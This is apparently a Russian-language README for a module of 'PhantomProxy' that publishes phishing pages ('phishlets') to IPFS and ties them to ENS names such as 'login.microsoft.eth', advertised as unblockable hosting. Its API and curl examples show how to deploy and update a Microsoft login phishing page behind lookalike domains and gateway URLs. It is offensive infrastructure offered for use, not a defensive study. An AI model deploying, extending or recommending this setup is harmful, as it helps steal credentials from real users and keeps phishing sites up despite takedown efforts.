# 🌐 DECENTRALIZED HOSTING MODULE (IPFS + ENS)

Децентрализованный хостинг для PhantomProxy

---

## 📋 ОПИСАНИЕ

Модуль децентрализованного хостинга который:

1. **Публикует страницы в IPFS** через Pinata или локальный нод
2. **Интегрируется с ENS** для доменных имён в блокчейне
3. **Автообновление** контента через IPNS
4. **Неблокируемая инфраструктура** — контент распределён по сети

---

## 🚀 ВОЗМОЖНОСТИ

### ✅ IPFS Интеграция

- **Pinata** — популярный pinning сервис
- **Локальный IPFS нод** — для полного контроля
- **Автоматический пиннинг** — контент сохраняется в сети
- **Кэширование** — локальное хранение CID

### ✅ ENS Интеграция

- **Регистрация имён** — например `phishing.eth`
- **Обновление записей** — привязка к IPFS CID
- **Разрешение имён** — получение CID по имени

### ✅ Децентрализация

- **Нет единой точки отказа** — контент в IPFS
- **Неблокируемо** — нет центрального сервера
- **Автономность** — работает без VPS

---

## 📡 API ENDPOINTS

### POST /api/v1/decentral/host

Публикация страницы в IPFS + ENS.

**Request:**
```json
{
  "name": "microsoft-login",
  "source_path": "./phishlets/microsoft",
  "ens_name": "login.microsoft.eth"
}
```

**Response:**
```json
{
  "success": true,
  "page": {
    "name": "microsoft-login",
    "ipfs_cid": "QmX7Zm9...",
    "ens_name": "login.microsoft.eth",
    "gateway_url": "https://ipfs.io/ipfs/QmX7Zm9...",
    "ens_url": "https://login.microsoft.eth.limo",
    "created_at": "2026-02-18T12:00:00Z",
    "auto_update": false
  },
  "gateway_url": "https://ipfs.io/ipfs/QmX7Zm9...",
  "ens_url": "https://login.microsoft.eth.limo"
}
```

### POST /api/v1/decentral/update/:name

Обновление страницы (новый CID).

**Response:**
```json
{
  "success": true,
  "page": {...},
  "message": "Page updated successfully"
}
```

### GET /api/v1/decentral/pages

Список всех страниц.

**Response:**
```json
{
  "success": true,
  "pages": [
    {
      "name": "microsoft-login",
      "ipfs_cid": "QmX7Zm9...",
      "gateway_url": "https://ipfs.io/ipfs/QmX7Zm9...",
      "ens_url": "https://login.microsoft.eth.limo"
    }
  ],
  "total": 1
}
```

### DELETE /api/v1/decentral/pages/:name

Удаление страницы (unpin).

---

## 🔗 АРХИТЕКТУРА

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  PhantomProxy   │────▶│  Decentralized   │────▶│     Pinata      │
│    (Go API)     │     │    Hosting       │     │   (IPFS Pin)    │
└─────────────────┘     └──────────────────┘     └─────────────────┘
                               │
                               ▼
                        ┌──────────────────┐
                        │  Ethereum + ENS  │
                        │  (Name Resolve)  │
                        └──────────────────┘
                               │
                               ▼
                        ┌──────────────────┐
                        │  IPFS Gateway    │
                        │  (eth.limo)      │
                        └──────────────────┘
```

**Flow:**
1. Пользователь: `POST /api/v1/decentral/host`
2. Decentralized Hosting: Загрузка в IPFS → получение CID
3. ENS: Регистрация имени → привязка CID
4. Возврат: Gateway URL + ENS URL

---

## ⚙️ КОНФИГУРАЦИЯ

### config.yaml

```yaml
# Decentralized Hosting
decentral:
  enabled: true
  
  # IPFS
  ipfs:
    pinata_api_key: "YOUR_PINATA_KEY"
    pinata_secret_key: "YOUR_PINATA_SECRET"
    local_node_url: "http://localhost:5001"
    cache_dir: "./ipfs_cache"
  
  # ENS
  ens:
    ethereum_rpc: "https://mainnet.infura.io/v3/YOUR_PROJECT_ID"
    private_key: "YOUR_ETH_PRIVATE_KEY"
    registry_address: "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"
  
  # Автообновление
  auto_update:
    enabled: true
    interval: 3600 # секунд
```

---

## 🛡️ БЕЗОПАСНОСТЬ

### Приватные ключи

- **Шифрование** — ключи шифруются в хранилище
- **Доступ** — только из whitelisted IP
- **Gas лимиты** — ограничение на транзакции

### IPFS Pinning

- **Pinata** — надёжный pinning сервис
- **Локальный нод** — полный контроль
- **Резервирование** — несколько копий

---

## 📈 МОНИТОРИНГ

### Метрики

- Количество страниц в IPFS
- Размер данных
- Количество ENS записей
- Gas потрачено

### Логи

```bash
tail -f /var/log/phantom/decentral.log
```

---

## 🐛 TROUBLESHOOTING

### Ошибка: "Failed to upload to IPFS"

**Решение:** Проверить API ключи Pinata или доступность локального IPFS.

### Ошибка: "ENS registration failed"

**Решение:** Проверить баланс ETH для gas fees.

### Ошибка: "Page not found"

**Решение:** Проверить что страница была создана через API.

---

## 🎯 ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ

### Пример 1: Публикация фишлета

```bash
curl -X POST http://localhost:8080/api/v1/decentral/host \
  -H "Authorization: Bearer secret" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "microsoft-phish",
    "source_path": "./phishlets/microsoft",
    "ens_name": "login.microsoft.phishing.eth"
  }'
```

### Пример 2: Обновление страницы

```bash
curl -X POST http://localhost:8080/api/v1/decentral/update/microsoft-phish \
  -H "Authorization: Bearer secret"
```

### Пример 3: Доступ через шлюз

Открыть в браузере:
```
https://ipfs.io/ipfs/QmX7Zm9...
```

Или через ENS шлюз:
```
https://login.microsoft.phishing.eth.limo
```

---

## 📝 ЗАВИСИМОСТИ

### Go модули

```go
github.com/ethereum/go-ethereum  // ENS интеграция
github.com/ipfs/go-ipfs-api      // IPFS (опционально)
```

### Python (для Pinata CLI)

```bash
pip install ipfshttpclient
```

---

## 🎯 СЛЕДУЮЩИЕ ШАГИ

1. **IPNS поддержка** — динамическое обновление без смены CID
2. **Filecoin интеграция** — долгосрочное хранение
3. **Arweave поддержка** — перманентное хранение
4. **Multi-gateway** — несколько шлюзов для надёжности

---

**Версия:** 1.0.0  
**Автор:** PhantomProxy Team  
**Лицензия:** MIT
